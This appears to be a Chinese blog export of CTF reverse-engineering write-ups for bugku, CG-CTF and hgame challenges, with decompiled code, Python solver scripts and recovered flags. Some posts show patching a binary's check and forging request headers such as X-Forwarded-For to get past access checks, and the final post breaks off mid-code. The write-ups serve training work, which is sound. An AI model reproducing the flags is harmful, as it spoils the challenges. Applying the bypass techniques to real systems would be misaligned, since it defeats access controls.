{"pages":[],"posts":[{"title":"bugku-re部分题解","text":"这里记录一下bugku平台上一些re题的题解 入门逆向直接拖进IDA反编译 直接可以看到flag Easy_vbIDA或OD反编译，搜索字符串 看到有flag样式的字符串，是MCTF比赛的题，bugku上需要提交flag(xxx)，所以把MCTF改成flag{} Easy_Re用OD调试，搜索字符串，找到需要我们输入字符串的位置：发现提示语和%s，找到输入字符串的位置，加断点单步调试程序会把输入的字符串和flag进行比较，相同则通过，在寄存器中找到正确的flag 游戏过关这题可以有至少三种解法：1、第一种解法直接游戏通关，很简单，依次输入1-8即可2、使用OD修改程序首先查找字符串找到输出flag关键函数找到如图所示函数的起始地址，跳转两次找到关键判断可以看到jnz指令进行了跳转，如果没有跳转，将会执行输出flag的函数，现在修改程序，将跳转过后的指令修改为输出flag指令直接运行程序，输入任意数字都可得到flag3、进行解码解出flag可在上图4-2中看到处理flag的部分，将下面的16进制进行解码即可都得到flag 逆向入门下载下来admin.exe，发现打不开，peid检查发现不是PE程序，用文本编辑器打开，发现时图片转base64，转成图片得到二维码扫描得到flag loveIDA打开反编译，找到输出部分发现进行了处理之后将两个base64比较，如果相同就输出flag正确，所以只要将Str2进行反变换就得到了正确的flag import base64s = \"e3nifIH9b_C@n@dH\"flag = \"\"for i in range(len(s)): flag += chr(ord(s[i]) - i)flag = base64.b64decode(flag)print(flag)","link":"/2020/01/11/bugku-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"},{"title":"Hello World","text":"My first post to say “Hello”.","link":"/2019/12/30/hello-world/"},{"title":"CGCTF-re部分题解","text":"CG-CTF是南邮的平台，题目都很不错，这里记录一下部分题解决题目的思路和方法 Hello,RE打开程序，发现输入flag，用OD打开，注意到是将输入的字符串和flag直接进行比较，所以单步调试直接找到flag ReadAsm2这题考的是直接读汇编的能力，代码贴在下面 int main(int argc, char const *argv[]){ char input[] = {0x0, 0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d, 0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 0x63, 0x4e, 0x66, 0x7b, 0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66 , 0x1c}; func(input, 28); printf(\"%s\\n\",input+1); return 0;} 00000000004004e6 &lt;func&gt;: 4004e6: 55 push rbp 4004e7: 48 89 e5 mov rbp,rsp 4004ea: 48 89 7d e8 mov QWORD PTR [rbp-0x18],rdi 4004ee: 89 75 e4 mov DWORD PTR [rbp-0x1c],esi 4004f1: c7 45 fc 01 00 00 00 mov DWORD PTR [rbp-0x4],0x1 4004f8: eb 28 jmp 400522 &lt;func+0x3c&gt; 4004fa: 8b 45 fc mov eax,DWORD PTR [rbp-0x4] 4004fd: 48 63 d0 movsxd rdx,eax 400500: 48 8b 45 e8 mov rax,QWORD PTR [rbp-0x18] 400504: 48 01 d0 add rax,rdx 400507: 8b 55 fc mov edx,DWORD PTR [rbp-0x4] 40050a: 48 63 ca movsxd rcx,edx 40050d: 48 8b 55 e8 mov rdx,QWORD PTR [rbp-0x18] 400511: 48 01 ca add rdx,rcx 400514: 0f b6 0a movzx ecx,BYTE PTR [rdx] 400517: 8b 55 fc mov edx,DWORD PTR [rbp-0x4] 40051a: 31 ca xor edx,ecx 40051c: 88 10 mov BYTE PTR [rax],dl 40051e: 83 45 fc 01 add DWORD PTR [rbp-0x4],0x1 400522: 8b 45 fc mov eax,DWORD PTR [rbp-0x4] 400525: 3b 45 e4 cmp eax,DWORD PTR [rbp-0x1c] 400528: 7e d0 jle 4004fa &lt;func+0x14&gt; 40052a: 90 nop 40052b: 5d pop rbp 40052c: c3 ret 发现这段汇编的作用就是实现input[i]^i，所以实现上面代码输出得到flag s = [0x0, 0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d, 0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 0x63, 0x4e, 0x66, 0x7b, 0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66, 0x1c]for i in range(len(s)): s[i] ^= iout = ''for i in range(len(s)): out += chr(s[i])print(out) 输出flag为： flag{read_asm_is_the_basic} Py交易本题是python的反编译，使用在线工具或uncompyle6将pyc文件反编译，得到代码 import base64def encode(message): s = '' for i in message: x = ord(i) ^ 32 x = x + 16 s += chr(x) return base64.b64encode(s)correct = 'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'flag = ''print 'Input flag:'flag = raw_input()if encode(flag) == correct: print 'correct'else: print 'wrong'import base64def encode(message): s = '' for i in message: x = ord(i) ^ 32 x = x + 16 s += chr(x) return base64.b64encode(s)correct = 'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'flag = ''print 'Input flag:'flag = raw_input()if encode(flag) == correct: print 'correct'else: print 'wrong' 研究代码，发现我们只要将correct逆向解密，就可以得到正确的flag，所以得到如下exp： import base64correct = 'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'correct = str(base64.b64decode(correct)) # ^SdVkT#S ]`Y\\\\!^)\\x8f\\x80ism# print(correct)correct = '^SdVkT#S ]`Y\\\\!^)\\x8f\\x80ism'flag = ''for s in correct: x = ord(s) x -= 16 i = chr(x ^ 32) flag += iprint(flag) 输出flag为： nctf{d3c0mpil1n9_PyC} WxyVM下载下来不知道是什么文件，记事本打开，开头ELF，所以直接拖进IDA反编译，main函数如下： __int64 __fastcall main(__int64 a1, char **a2, char **a3){ char v4; // [rsp+Bh] [rbp-5h] signed int i; // [rsp+Ch] [rbp-4h] puts(\"[WxyVM 0.0.1]\"); puts(\"input your flag:\"); scanf(\"%s\", &amp;byte_604B80); v4 = 1; sub_4005B6(); if ( strlen(&amp;byte_604B80) != 24 ) v4 = 0; for ( i = 0; i &lt;= 23; ++i ) { if ( *(&amp;byte_604B80 + i) != dword_601060[i] ) v4 = 0; } if ( v4 ) puts(\"correct\"); else puts(\"wrong\"); return 0LL;} 一开始认为需要输入一个24位的flag，然后和dword_601060每一位都相等即可，但是中间的sub_4005B6()函数对我们输入的flag还进行了一些变换，所以需要把dword_601060对应的进行反变换才能得到应该输入的正确的flag sub_4005B6()函数如下： __int64 sub_4005B6(){ unsigned int v0; // ST04_4 __int64 result; // rax signed int i; // [rsp+0h] [rbp-10h] char v3; // [rsp+8h] [rbp-8h] for ( i = 0; i &lt;= 14999; i += 3 ) { v0 = byte_6010C0[i]; v3 = byte_6010C0[i + 2]; result = v0; switch ( v0 ) { case 1u: result = byte_6010C0[i + 1]; *(&amp;byte_604B80 + result) += v3; break; case 2u: result = byte_6010C0[i + 1]; *(&amp;byte_604B80 + result) -= v3; break; case 3u: result = byte_6010C0[i + 1]; *(&amp;byte_604B80 + result) ^= v3; break; case 4u: result = byte_6010C0[i + 1]; *(&amp;byte_604B80 + result) *= v3; break; case 5u: result = byte_6010C0[i + 1]; *(&amp;byte_604B80 + result) ^= *(&amp;byte_604B80 + byte_6010C0[i + 2]); break; default: continue; } } return result;} 用IDA将byte_6010C0导出，用python进行逆向处理 s = [0xc4, 0x34, 0x22, 0xb1, 0xd3, 0x11, 0x97, 0x7, 0xdb, 0x37, 0xc4, 0x6, 0x1d, 0xfc, 0x5b, 0xed, 0x98, 0xdf, 0x94,0xd8, 0xb3, 0x84, 0xcc, 0x8]# dword与char比较，只取最后一位一个字节with open('export_results.txt') as f: #文件里是导出的byte_6010C0 t = f.read().split(' ')# print(len(t))for i in range(5000): v0 = int(t[3 * (4999 - i)], 16) v3 = int(t[3 * (4999 - i) + 2], 16) result = int(t[3 * (4999 - i) + 1], 16) if v0 == 1: s[result] -= v3 elif v0 == 2: s[result] += v3 elif v0 == 3: s[result] ^= v3 elif v0 == 4: s[result] /= v3 elif v0 == 5: s[result] ^= s[v3] else: continueprint(''.join([str(chr(int(i) % 128)) for i in s])) 这里有两件事需要注意，第一是dword只需要取最后一个字节，第二是逆运算时要从最后三位向前计算，最后输出flag: nctf{Embr4ce_Vm_j0in_R3} maze极其无聊的迷宫题…… 找到地图、起点终点和上下左右分别对应的键就可以了 nctf{o0oo00O000oooo..OO} WxyVM2拖进IDA反编译，发现函数非常大，操作特别多，但是仔细看发现最后要验证的都是byte类型，所有对dword的操作都是无效的，所以把所有操作拷贝到文件(export_results.txt)中，先进行过滤操作，过滤出需要的操作,最后的验证过程如下： for ( i = 0; i &lt;= 24; ++i ) { if ( *(&amp;byte_694100 + i) != dword_694060[i] ) v4 = 0; } if ( v4 ) puts(\"correct\"); else puts(\"wrong\"); return 0LL; 所以操作之后的数组和dword_694060数组的每个数的最后一位相同，将数组导出，进行逆运算得到原来输入的flag，python代码如下： import rewith open('export_results.txt') as f: s = '' a = f.readline() while a: if re.match(r'(.*)byte_6941(.*);', a): s += a a = f.readline() with open('s.txt', 'w+') as ff: s = s.split('\\n') n = len(s) # print(len(s)) # print(s) for i in range(n): ff.write(s[n - 1 - i].strip() + '\\n')ss = [0xC0, 0x85, 0xF9, 0x6C, 0xE2, 0x14, 0xBB, 0xe4, 0xd, 0x59, 0x1c, 0x23, 0x88, 0x6e, 0x9b, 0xca, 0xba, 0x5c, 0x37, 0xfff, 0x48, 0xd8, 0x1f, 0xab, 0xa5]with open('s.txt') as f: a = f.readline() while a: # print(re.match(r'(.*)byte_6941(.*);', a).groups()) if not re.match(r'(.*)byte_6941(.*);', a).group(1).strip(): s = re.match(r'(.*)byte_6941(.*);', a).group(2).split(' ') # print(s) i = int(s[0], 16) # print(i) i1 = str(ss[i]) if s[1] == '+=': sub = '-' elif s[1] == '-=': sub = '+' else: sub = '^' if re.match(r'(.*)u', s[2]): s2 = re.match(r'(.*)u', s[2]).group(1) else: s2 = s[2] exp = i1 + sub + s2 ss[i] = eval(exp) % 128 else: s = re.match(r'(.*)byte_6941(.*);', a).group(2).split(' ') # print(s) i = int(s[0], 16) # print(i) i1 = str(ss[i]) if re.match(r'(.*)byte_6941(.*);', a).group(1).strip() == '++': sub = '-' if re.match(r'(.*)byte_6941(.*);', a).group(1).strip() == '--': sub = '+' exp = i1 + sub + '1' ss[i] = eval(exp) % 128 a = f.readline() # print(ss)print(''.join([str(chr(i % 128)) for i in ss])) 这里要注意一点，python没有++和–操作，所以直接++和–的传唤算不出正确值，在这里卡了一会儿才发现问题。 运行程序输出flag： nctf{th3_vM_w1th0ut_dAta} 你大概需要一个优秀的mac这是一个macos程序，没法直接打开，所以还是拖进IDA反编译，发现需要输入一个56位的flag，然后经过几个函数处理之后与一个数组进行比较，相同则输入的是正确的flag，所以还是一样进行一个逆运算 反编译出来的代码如下： scanf(\"%s\", &amp;v4); if ( strlen(&amp;v4) != 56 ) { puts((const char *)err); exit(0); } __strcpy_chk(input, &amp;v4, 100LL); func1((__int64)input); xfun1(); xfun2(); xfun3(); xfun4(); xfun5(); check();//func1 for ( i = 0; i &lt; 57; ++i ) //这里应该是56？ { *(_BYTE *)(a1 + i) ^= 0xDEu; }//xfun1 for ( i = 0; i &lt; 10; ++i ) { input[i] ^= 0xADu; }//xfun2 for ( i = 0; i &lt; 10; ++i ) { input[i + 10] ^= 0xBEu; }//xfun3 for ( i = 0; i &lt; 10; ++i ) { input[i + 20] ^= 0xEFu; }//xfun4 for ( i = 0; i &lt; 10; ++i ) { input[i + 30] ^= 0xABu; }//xfun5 for ( i = 0; i &lt; 16; ++i ) { input[i + 40] ^= 0xEFu; }//check memcpy(v2, &amp;byte_100000ED0, 0xE0uLL); for ( i = 0; i &lt; 56; ++i ) { if ( (char)input[i] != v2[i] ) { puts((const char *)err); exit(0); } } 所以将byte_100000ED0处的数组导出，进行逆运算，代码如下： s = [0x15, 0x1F, 0x12, 0x14, 0x08, 0x3A, 0x46, 0x2C, 0x07, 0x1B, 0x51, 0x13, 0x3F, 0x57, 0x08, 0x05, 0x3F, 0x30, 0x32, 0x51, 0x52, 0x02, 0x6E, 0x78, 0x16, 0x7C, 0x6E, 0x61, 0x70, 0x48, 0x1C, 0x3B, 0x32, 0x2A, 0x13, 0x45, 0x07, 0x2A, 0x18, 0x0C, 0x6E, 0x41, 0x70, 0x04, 0x06, 0x6E, 0x5C, 0x00, 0x42, 0x45, 0x70, 0x5A, 0x02, 0x04, 0x0E, 0x4C]for i in range(10): s[i]^=0xADfor i in range(10,20): s[i]^=0xBEfor i in range(20,30): s[i]^=0xEFfor i in range(30,40): s[i]^=0xABfor i in range(40,56): s[i]^=0xEFfor i in range(56): s[i]^=0xDEprint(''.join([str(chr(i%128)) for i in s])) 运行程序输出flag： flag{I5_th1s_7he_PR1c3_I'M_PAyiNG_f0r_my_pA57_m1stAk35?}","link":"/2020/01/11/CGCTF-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"},{"title":"hgame_wp","text":"记录一下Hgame的部分题解和一些解题时的思路 Week1Web接 头 霸 王打开题目，发现提示需要从vidar.club过来，所以burp抓包到repeater，添加响应头： Referer:https://vidar.club 然后提示需要从本地访问，添加响应头： X-Forwarded-For: 127.0.0.1 接着提示flag会在2077年更新，所以添加响应头： If-Unmodified-Since:Fri, 01 Jan 2077 00:00:00 GMT 再发送请求得到flag hgame{W0w!Your_heads_@re_s0_many!} REmaze一看题目又是一道迷宫题，拖进IDA反编译 v5 = (char *)&amp;unk_6020C4; while ( (signed int)v4 &lt; SHIDWORD(v4) ) { v3 = s[(signed int)v4]; if ( v3 == 100 ) { v5 += 4; } else if ( v3 &gt; 100 ) { if ( v3 == 115 ) { v5 += 64; } else { if ( v3 != 119 ) {LABEL_12: puts(\"Illegal input!\"); exit(0); } v5 -= 64; } } else { if ( v3 != 97 ) goto LABEL_12; v5 -= 4; } if ( v5 &lt; (char *)&amp;unk_602080 || v5 &gt; (char *)&amp;unk_60247C || *(_DWORD *)v5 &amp; 1 ) goto LABEL_22; LODWORD(v4) = v4 + 1; } if ( v5 == (char *)&amp;unk_60243C ) { sprintf(&amp;v7, \"hgame{%s}\", s, v4); puts(\"You win!\"); printf(\"Flag is: \"); puts(&amp;v7); exit(0); }LABEL_22: puts(\"You died\"); exit(0); 贴出来的是反编译出来的主要部分，从这里可以确定v5的起始位置是unk_6020C4，上下左右分别是’w’,’s’,’a’,’d’，左右移动变化4字节，将所有的数据转化为DWORD类型，上下移动变化64字节，所以每行16个元素，范围是unk_602080到unk_60247C，正好是256个DWORD类型，组成16*16的方阵，其中所有和1按位与运算结果为0的是可以走的路线，即所有末尾为0的值是可以走的位置，最终的目标是走到unk_60243C这个点 即从（2，2）位置走到（15，16）位置 所以最后的flag为 hgame{ssssddddddsssssddwwdddssssdssdd} bitwise_operation2这题是让人头疼的位运算符，要把运算总共分为三个部分，要把整个过程都弄清楚，然后一部分一部分的逆向出来，任何一部分错了都会导致最终flag出错，还是挺考验细心和耐心的。 首先发现是linux可执行文件，拖进IDA反编译，并且对每一部分的作用进行一个分析 //只贴出了有用的部分并且稍做了排版void __fastcall __noreturn main(__int64 a1, char **a2, char **a3){ char v6; // [rsp+10h] [rbp-60h] char v7; // [rsp+11h] [rbp-5Fh] char v8; // [rsp+12h] [rbp-5Eh] char v9; // [rsp+13h] [rbp-5Dh] char v10; // [rsp+14h] [rbp-5Ch] char v11; // [rsp+15h] [rbp-5Bh] char v12; // [rsp+16h] [rbp-5Ah] char v13; // [rsp+17h] [rbp-59h] __int64 v14; // [rsp+20h] [rbp-50h] char v15; // [rsp+28h] [rbp-48h] __int64 v16; // [rsp+30h] [rbp-40h] char v17; // [rsp+38h] [rbp-38h] char s; // [rsp+40h] [rbp-30h] //地址是连续的，flag中间的具体内容是v24和v25起始的两个16 char v19; // [rsp+41h] [rbp-2Fh] //字节 char v20; // [rsp+42h] [rbp-2Eh] char v21; // [rsp+43h] [rbp-2Dh] char v22; // [rsp+44h] [rbp-2Ch] char v23; // [rsp+45h] [rbp-2Bh] __int16 v24; // [rsp+46h] [rbp-2Ah] __int16 v25; // [rsp+56h] [rbp-1Ah] char v26; // [rsp+66h] [rbp-Ah] sub_4007E6();//只负责输出，没什么功能 v6 = 76;v7 = 60;v8 = 214;v9 = 54;v10 = 80;v11 = 136;v12 = 32;v13 = 204; __isoc99_scanf(\"%39s\", &amp;s); if ( strlen(&amp;s) == 39 &amp;&amp; s == 'h' &amp;&amp; v19 == 'g' &amp;&amp; v20 == 'a' &amp;&amp; v21 == 'm' &amp;&amp; v22 == 'e' &amp;&amp; v23 == '{' &amp;&amp; v26 == '}' )// 共39位，hgame{***}格式 { v14 = 0LL; v15 = 0; v16 = 0LL; v17 = 0; //这两条命令进行第一部分运算 sub_400616((__int64)&amp;v14, (__int64)&amp;v24); // 传入地址，对flag中的部分进行操作 sub_400616((__int64)&amp;v16, (__int64)&amp;v25); //这里开始进行第二部分运算 for ( i = 0; i &lt;= 7; ++i ) { *((_BYTE *)&amp;v14 + i) = ((*((_BYTE *)&amp;v14 + i) &amp; 0xE0) &gt;&gt; 5) | 8 * *((_BYTE *)&amp;v14 + i);// &amp;v14 + i前三位与后五位交换位置 *((_BYTE *)&amp;v14 + i) = *((_BYTE *)&amp;v14 + i) &amp; 0x55 ^ ((*((_BYTE *)&amp;v16 + 7 - i) &amp; 0xAA) &gt;&gt; 1) | *((_BYTE *)&amp;v14 + i) &amp; 0xAA;// &amp;v14+i的奇数位不变，偶数位和&amp;v16+7-i的奇数位异或 *((_BYTE *)&amp;v16 + 7 - i) = 2 * (*((_BYTE *)&amp;v14 + i) &amp; 0x55) ^ *((_BYTE *)&amp;v16 + 7 - i) &amp; 0xAA | *((_BYTE *)&amp;v16 + 7 - i) &amp; 0x55;// &amp;v16+7-i的偶数位不变，奇数位和&amp;v14+i的偶数位异或 *((_BYTE *)&amp;v14 + i) = *((_BYTE *)&amp;v14 + i) &amp; 0x55 ^ ((*((_BYTE *)&amp;v16 + 7 - i) &amp; 0xAA) &gt;&gt; 1) | *((_BYTE *)&amp;v14 + i) &amp; 0xAA;// &amp;v14+i奇数位不变，偶数位和&amp;v16+7-i的奇数位异或 } //这里进行第三部分运算 for ( j = 0; j &lt;= 7; ++j ) { *((_BYTE *)&amp;v14 + j) ^= *(&amp;v6 + j); // v6 = 76; // v7 = 60; // v8 = 214; // v9 = 54; // v10 = 80; // v11 = 136; // v12 = 32; // v13 = 204; if ( *((_BYTE *)&amp;v14 + j) != byte_602050[j] )// e4sy_Re_ { puts(\"sry, wrong flag\"); exit(0); } } for ( k = 0; k &lt;= 7; ++k ) { *((_BYTE *)&amp;v16 + k) ^= *((_BYTE *)&amp;v14 + k) ^ *(&amp;v6 + k); // v6 = 76; //这里异或之后又变成了V14最初始的值 // v7 = 60; // v8 = 214; // v9 = 54; // v10 = 80; // v11 = 136; // v12 = 32; // v13 = 204; if ( *((_BYTE *)&amp;v16 + k) != byte_602060[k] )// Easylif3 { puts(\"Just one last step\"); exit(0); } } puts(\"Congratulations! You are already familiar with bitwise operation.\"); puts(\"Flag is your input.\"); exit(0); } puts(\"Illegal input!\"); exit(0);}//sub_400616() 第一部分运算所用到的函数_BYTE *__fastcall sub_400616(__int64 a1, __int64 a2){ _BYTE *result; // rax signed int i; // [rsp+1Ch] [rbp-4h] for ( i = 0; i &lt;= 7; ++i ) { if ( *(_BYTE *)(2 * i + a2) &lt;= 96 || *(_BYTE *)(2 * i + a2) &gt; 102 ) { if ( *(_BYTE *)(2 * i + a2) &lt;= 47 || *(_BYTE *)(2 * i + a2) &gt; 57 ) {LABEL_17: puts(\"Illegal input!\"); exit(0); } *(_BYTE *)(i + a1) = *(_BYTE *)(2 * i + a2) - 48; } else { *(_BYTE *)(i + a1) = *(_BYTE *)(2 * i + a2) - 87; } if ( *(_BYTE *)(2 * i + 1LL + a2) &lt;= 96 || *(_BYTE *)(2 * i + 1LL + a2) &gt; 102 ) { if ( *(_BYTE *)(2 * i + 1LL + a2) &lt;= 47 || *(_BYTE *)(2 * i + 1LL + a2) &gt; 57 ) goto LABEL_17; result = (_BYTE *)(i + a1); *result = 16 * *result + *(_BYTE *)(2 * i + 1LL + a2) - 48; } else { result = (_BYTE *)(i + a1); *result = 16 * *result + *(_BYTE *)(2 * i + 1LL + a2) - 87; } } return result;}//sub_400616()这里的处理逻辑有些混乱，实际上就是只能输入0-9，a-f之间的字符，然后对数字和字母会进行不同的处理 把整个过程理解清楚之后可以开始写脚本进行一个逆运算了 #-*- coding:utf-8 -*-# 第三部分逆运算v = [76, 60, 214, 54, 80, 136, 32, 204]v0 = 'e4sy_Re_'v14 = []for i in range(len(v0)): v14.append(ord(v0[i]) ^ v[i])# print(v14)v16 = []v1 = 'Easylif3'for i in range(len(v1)): v16.append(ord(v1[i]) ^ v14[i]) # v14经过两次和v的异或又变回了原本的值# print(v16)# 第二部分逆运算for i in range(8): # print(bin(v14[i])[2:].rjust(8,'0')) v14[i] = (((v14[i] &amp; 0x55) ^ ((v16[7 - i] &amp; 0xAA) &gt;&gt; 1) % 256) | v14[i] &amp; 0xAA) % 256 # print(bin(v14[i])[2:].rjust(8,'0')) # print(bin(v16[7-i])[2:].rjust(8, '0')) v16[7 - i] = (2 * (v14[i] &amp; 0x55) ^ v16[7 - i] &amp; 0xAA | v16[7 - i] &amp; 0x55) % 256 # print(bin(v16[7-i])[2:].rjust(8, '0')) # print(bin(v14[i])[2:].rjust(8, '0')) v14[i] = (((v14[i] &amp; 0x55) ^ ((v16[7 - i] &amp; 0xAA) &gt;&gt; 1) % 256) | v14[i] &amp; 0xAA) % 256 # print(bin(v14[i])[2:].rjust(8, '0')) # print(bin(v14[i])[2:].rjust(8,'0')) v14[i] = (((v14[i] &amp; 0x1F) &lt;&lt; 5) | ((v14[i] &amp; 0xF8) &gt;&gt; 3)) % 256 # print(bin(v14[i])[2:].rjust(8,'0'))# print(v14)# print(v16)# 第一部分逆运算v24 = [0 for i in range(16)]v25 = [0 for i in range(16)]alphabet = [48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102]# 字母表不多，逆运算难以进行所以采用遍历的方式进行计算for i in range(8): for j in alphabet: if 57 &gt;= j &gt; 47: tmp = j - 48 else: tmp = j - 87 v24[2*i]=j if 57 &gt;= v14[i] - 16 * tmp + 48 &gt; 47: v24[2 * i + 1] = v14[i] - 16 * tmp + 48 break elif 102 &gt;= v14[i] - 16 * tmp + 87 &gt; 96: v24[2 * i + 1] = v14[i] - 16 * tmp + 87 break else: continuefor i in range(8): for j in alphabet: v25[2 * i] = j if 57 &gt;= j &gt; 47: tmp = j - 48 else: tmp = j - 87 if 102 &gt;= v16[i] - 16 * tmp + 87 &gt; 96: v25[2 * i + 1] = v16[i] - 16 * tmp + 87 break elif 57 &gt;= v16[i] - 16 * tmp + 48 &gt; 47: v25[2 * i + 1] = v16[i] - 16 * tmp + 48 break else: continue# print(v24)# print(v25)flag = 'hgame{'+''.join([chr(v24[i]) for i in range(16)]) + ''.join([chr(v25[i]) for i in range(16)])+'}'print(flag) 输出得到flag hgame{0f233e63637982d266cbf41ecb1b0102} 到虚拟机上验证一下，发现结果正确 advancewindows可执行程序，打开发现还是让输入flag，然后验证正确与否，还是IDA反编译，发现所有的函数名字IDA都识别不了，根据程序打开的提示语，搜索所有字符串找到主函数入口，根据具体操作给部分函数和变量重新命名，大概了解其用途 int __cdecl main(int argc, const char **argv, const char **envp){ __int64 len; // rax int len0; // edi unsigned __int64 v5; // rax _BYTE *v6; // rbx const char *v7; // rcx char flag; // [rsp+20h] [rbp-118h] puts(\"please input you flag:\\n\"); memset(&amp;flag, 0, 0x100ui64); scanf(\"%s\", &amp;flag, 100i64); len = strlen(&amp;flag); // 如果输入的字符串少于256个字符，则返回字符串长度，否则返回256（0x100） len0 = len; if ( !len ) // 若输入空字符串，直接报错 {LABEL_6: v7 = \"try again\\n\"; goto LABEL_7; } v5 = sub_140002000(len); v6 = malloc(v5); // 分配空间 cryption(v6, (__int64)&amp;flag, len0); // 加密算法部分 if ( strncmp(v6, \"0g371wvVy9qPztz7xQ+PxNuKxQv74B/5n/zwuPfX\", 0x64ui64) )// 相同则返回0，跳过if，输出get it，flag正确 { if ( v6 ) free(v6); goto LABEL_6; } v7 = \"get it\\n\";LABEL_7: puts(v7); return 0;}//最重要的cryption加密函数signed __int64 __fastcall sub_140001EB0(_BYTE *a1, __int64 a2, int a3){ int v3; // er10 __int64 v4; // rax __int64 v5; // rbx _BYTE *v6; // rdi _BYTE *v7; // r9 signed __int64 v8; // r11 unsigned __int64 v9; // rdx unsigned __int64 v10; // rax char v11; // cl // a1是加密后输出内容的首地址，a2是输入的flag的首地址，a3是flag长度 v3 = 0; v4 = a3 - 2; v5 = a2; v6 = a1; v7 = a1; if ( v4 &gt; 0 ) { v8 = a2 + 1; v9 = ((unsigned __int64)((unsigned __int64)(v4 - 1) * (unsigned __int128)0xAAAAAAAAAAAAAAABui64 &gt;&gt; 64) &gt;&gt; 1) + 1; v3 = 3 * v9; do { v10 = *(unsigned __int8 *)(v8 - 1); v8 += 3i64; *v7 = alphabet[v10 &gt;&gt; 2]; v7[1] = alphabet[((unsigned __int64)*(unsigned __int8 *)(v8 - 3) &gt;&gt; 4) | 16i64 * (*(_BYTE *)(v8 - 4) &amp; 3)]; v7[2] = alphabet[4i64 * (*(_BYTE *)(v8 - 3) &amp; 0xF) | ((unsigned __int64)*(unsigned __int8 *)(v8 - 2) &gt;&gt; 6)]; v7[3] = alphabet[*(_BYTE *)(v8 - 2) &amp; 0x3F]; v7 += 4; --v9; } while ( v9 ); } if ( v3 &lt; a3 ) { *v7 = alphabet[(unsigned __int64)*(unsigned __int8 *)(v3 + v5) &gt;&gt; 2]; if ( v3 == a3 - 1 ) { v11 = 61; v7[1] = alphabet[16 * (*(_BYTE *)(v3 + v5) &amp; 3)]; } else { v7[1] = alphabet[((unsigned __int64)*(unsigned __int8 *)(v5 + v3 + 1) &gt;&gt; 4) | 16i64 * (*(_BYTE *)(v3 + v5) &amp; 3)]; v11 = alphabet[4 * (*(_BYTE *)(v5 + v3 + 1) &amp; 0xF)]; } v7[2] = v11; v7[3] = 61; v7 += 4; } *v7 = 0; return v7 - v6 + 1;} 可以看到这里进行了很多操作，逆向起来很复杂而且工作量和难度都很多大，于是寻求别的方法，发现所有的操作都是围绕alphabet这一个字符数组来的，所以找到这个数组 alphabet='abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ' 观察发现这个数组非常熟悉，和base64的字母表完全一样，只是字符调换了顺序，然后观察最后的目标字符串，猜想这可能是改变字母表之后的base64编码，所以将之前的base64解码程序字母表修改为本题所提供的字母表，运行程序获得flag，所以猜想是正确的。 #-*- coding:utf-8 -*-def b64de(path_in, path_out): b64_str = open(path_in).read() charset = \"abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ\" # print(charset) bin_str = [] for i in b64_str: if i != '=': try: x = str(bin(charset.index(i))).replace('0b', '') except ValueError: print(i) bin_str.append('{:0&gt;6}'.format(x)) # 填充成6位 # print(bin_str) b64_bin = bytearray() # 最后只能写入bytes nums = len(bin_str) // 4 remain = len(bin_str) % 4 fore_part = bin_str[:4 * nums] # 四个一组截取 # print(fore_part) while fore_part: # 取4个6位base64字符，作为3个字节 b64_tmp = ''.join(fore_part[:4]) # 4*6/8 b64_tmp = [int(b64_tmp[x: x + 8], 2) for x in [0, 8, 16]] # 转换成10进制 # print(b64_tmp) for i in b64_tmp: b64_bin.append(i) fore_part = fore_part[4:] # 向后移动四位 if remain: remain_part = ''.join(bin_str[nums * 4:]) # print(remain_part) tmp = [int(remain_part[i * 8:(i + 1) * 8], 2) for i in range(remain - 1)] # print(tmp) for i in tmp: b64_bin.append(i) # print(b64_bin) fd = open(path_out, 'wb') fd.write(b64_bin) fd.close() if __name__ == '__main__': b64de(\"./pic_en.txt\", \"./pic_de.txt\") 输出的flag为： hgame{b45e6a_i5_50_eazy_6VVSQ} cpp这题函数实在是太多，而且应该是万恶的出题人故意把函数标识去掉了，理解起来简直窒息，但是逆向这个东西，七分理解三分猜，于是开猜 sub_140002AE0((__int64)&amp;v13); // 大概是string类的构造函数 sub_1400018D0(std::cin, &amp;v13); // cin&gt;&gt;v13 v15 = \"hgame{\"; sub_140002B30((__int64)&amp;v14); if ( find_sub(&amp;v13, v15, 0i64) || find_sub(&amp;v13, \"}\", 0i64) != 61 )// 猜测输入字符串长度位62，格式位hgame{***} { v5 = sub_140001900(std::cout, \"error\"); std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v5, sub_140002830); sub_140003010(&amp;v14); sub_140002FA0(&amp;v13); result = 0i64; } else { for ( i = 6i64; ; i = v11 + 1 ) // 一波操作完全看不懂，猜测是根据'_'来分割字符串，分割成9个数 { LOBYTE(v0) = '_'; v11 = find(&amp;v13, v0, i); if ( v11 == -1 ) break; v16 = sub_1400043B0(&amp;v13, &amp;v40, i, v11 - i); v17 = v16; v1 = sub_140003E80(v16); v18 = atoll(v1); sub_140004350(&amp;v14, &amp;v18); sub_140002FA0(&amp;v40); } v19 = sub_1400043B0(&amp;v13, &amp;v41, i, 61 - i); v20 = v19; v2 = sub_140003E80(v19); v21 = atoll(v2); // 直接把字符串转换成长整型，说明字符串里就是以'_'连接的数字 sub_140004350(&amp;v14, &amp;v21); sub_140002FA0(&amp;v41); v31 = 26727i64; // 根据下面的运算这里应该是两个矩阵 v32 = 24941i64; v33 = 101i64; v34 = 29285i64; v35 = 26995i64; v36 = 29551i64; v37 = 29551i64; v38 = 25953i64; v39 = 29561i64; v22 = 1i64; v23 = 0i64; v24 = 1i64; v25 = 0i64; v26 = 1i64; v27 = 1i64; v28 = 1i64; v29 = 2i64; v30 = 2i64; for ( j = 0i64; j &lt; 3; ++j ) // 三个for循环时矩阵运算，如果满足条件就直接输出正确 { for ( k = 0i64; k &lt; 3; ++k ) { v12 = 